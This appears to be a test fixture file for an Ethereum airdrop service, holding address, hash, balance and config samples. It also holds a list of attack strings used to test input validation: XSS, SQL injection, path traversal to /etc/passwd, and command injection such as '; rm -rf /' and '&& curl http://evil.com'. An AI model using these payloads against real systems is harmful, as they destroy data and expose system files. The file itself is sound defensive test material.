/**
 * Test data fixtures
 */

export const validAirdropRequests = {
  basic: {
    secretCode: 'TestCode1',
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  alternate: {
    secretCode: 'TestCode2',
    recipientAddress: '0x1234567890123456789012345678901234567890'
  },
  withSpecialChars: {
    secretCode: 'Test-Code_3.Valid',
    recipientAddress: '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd'
  }
};

export const invalidAirdropRequests = {
  xssInSecretCode: {
    secretCode: '<script>alert("xss")</script>',
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  xssInAddress: {
    secretCode: 'TestCode1',
    recipientAddress: '<script>alert("xss")</script>'
  },
  sqlInjection: {
    secretCode: "'; DROP TABLE users; --",
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  commandInjection: {
    secretCode: '; rm -rf /',
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  invalidAddressFormat: {
    secretCode: 'TestCode1',
    recipientAddress: 'not-an-address'
  },
  addressTooShort: {
    secretCode: 'TestCode1',
    recipientAddress: '0x123'
  },
  addressTooLong: {
    secretCode: 'TestCode1',
    recipientAddress: '0x' + 'a'.repeat(41)
  },
  addressWithInvalidChars: {
    secretCode: 'TestCode1',
    recipientAddress: '0x' + 'g'.repeat(40)
  },
  emptySecretCode: {
    secretCode: '',
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  nullSecretCode: {
    secretCode: null,
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  undefinedSecretCode: {
    secretCode: undefined,
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  oversizedSecretCode: {
    secretCode: 'A'.repeat(1000),
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  },
  secretCodeWithNullBytes: {
    secretCode: 'Test\0Code',
    recipientAddress: '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1'
  }
};

export const maliciousPayloads = {
  xssPayloads: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    'data:text/html,<script>alert("XSS")</script>'
  ],
  sqlInjectionPayloads: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 1=1--",
    "') OR ('1'='1",
    "' EXEC xp_cmdshell('dir') --"
  ],
  commandInjectionPayloads: [
    '; ls -la',
    '| cat /etc/passwd',
    '&& whoami',
    '`id`',
    '$(whoami)',
    '; ping -c 4 127.0.0.1',
    '&& curl http://evil.com',
    '; rm -rf /'
  ],
  pathTraversalPayloads: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '../../../../../../../../etc/passwd'
  ]
};

export const validEthereumAddresses = [
  '0x742d35Cc6634C0532925a3b8D6Ac6737DaE8D4E1',
  '0x1234567890123456789012345678901234567890',
  '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
  '0x0000000000000000000000000000000000000001',
  '0xffffffffffffffffffffffffffffffffffffffff'
];

export const invalidEthereumAddresses = [
  '0x123', // Too short
  '0x' + 'a'.repeat(41), // Too long
  '0x' + 'g'.repeat(40), // Invalid characters
  '123abc' + '0'.repeat(36), // Missing 0x prefix
  '0X' + 'a'.repeat(40), // Wrong case prefix
  '0x', // Empty address
  'not_an_address', // Completely invalid
  '', // Empty string
  null, // Null value
  undefined, // Undefined value
];

export const mockTransactionHashes = [
  '0x1234567890123456789012345678901234567890123456789012345678901234',
  '0xabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdef',
  '0x0000000000000000000000000000000000000000000000000000000000000001',
  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
];

export const mockBalances = {
  zero: '0',
  small: '1000000000000000', // 0.001 ETH
  normal: '1000000000000000000', // 1 ETH
  large: '1000000000000000000000' // 1000 ETH
};

export const testSecretCodes = [
  'TestCode1',
  'TestCode2',
  'TestCode3',
  'ValidSecret123',
  'Another-Valid_Code.Test'
];

export const environmentConfigs = {
  test: {
    NODE_ENV: 'test',
    PORT: '3001',
    GNOSIS_RPC_URL: 'http://localhost:8545',
    PRIVATE_KEY: 'a'.repeat(64),
    SECRET_CODES: 'TestCode1,TestCode2,TestCode3',
    WXHOPR_TOKEN_ADDRESS: '0x' + '1'.repeat(40),
    AIRDROP_AMOUNT_WEI: '1000000000000000000',
    XDAI_AIRDROP_AMOUNT_WEI: '1000000000000000000'
  },
  minimal: {
    NODE_ENV: 'test',
    PRIVATE_KEY: 'b'.repeat(64),
    SECRET_CODES: 'MinimalCode'
  },
  production: {
    NODE_ENV: 'production',
    PORT: '3000',
    GNOSIS_RPC_URL: 'https://rpc.gnosischain.com',
    PRIVATE_KEY: 'c'.repeat(64),
    SECRET_CODES: 'ProductionCode1,ProductionCode2'
  }
};
